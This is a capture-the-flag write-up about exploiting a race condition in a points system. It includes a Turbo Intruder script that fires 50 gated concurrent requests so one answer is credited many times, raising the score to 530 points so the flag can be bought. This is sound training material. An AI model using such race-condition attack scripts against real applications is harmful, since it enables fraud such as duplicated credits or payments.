This challenge was based on race condition. You are required to answer 3 questions which will give you 10 point each. You have to buy a flag whose value is 100 point.

![image](https://user-images.githubusercontent.com/19681324/158107862-cf51445b-b6c6-4872-849a-8f1eebbca6ee.png)

So we can use turbo intruder here to exploit this race condition. 

Each challenge will give you 10 points

![image](https://user-images.githubusercontent.com/19681324/158210423-283d2c58-dfb4-481e-a83b-bfcdebdf7fb5.png)

If you submit the answer and then try to exploit it with turbo intruder it won't work. Either submit the answer and intercept it with burp then exploit using turbo intruder
or start a fresh session and just replace the cookies

I used the below script for turbo intruder, can be easily found on portswigger github repo

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=50,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for i in range(50):
        engine.queue(target.req,  target.baseInput, gate='race1')

    engine.openGate('race1')

    engine.complete(timeout=5)


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    #if req.status != 404:
    table.add(req)
    ```
    

Don't forget to add a %s otherwise attack will not succeede. We just need it for execution of the attack
![image](https://user-images.githubusercontent.com/19681324/158211789-ecfec676-d867-4932-8e5b-de9bed94c978.png)

After successful attack we now have 530 point 
![image](https://user-images.githubusercontent.com/19681324/158211962-b38c48d5-520b-4a01-8091-e781ffef93ad.png)

we can easily buy the flag now

![image](https://user-images.githubusercontent.com/19681324/158212039-3d096017-def9-4f17-86c9-dcb49461e75b.png)

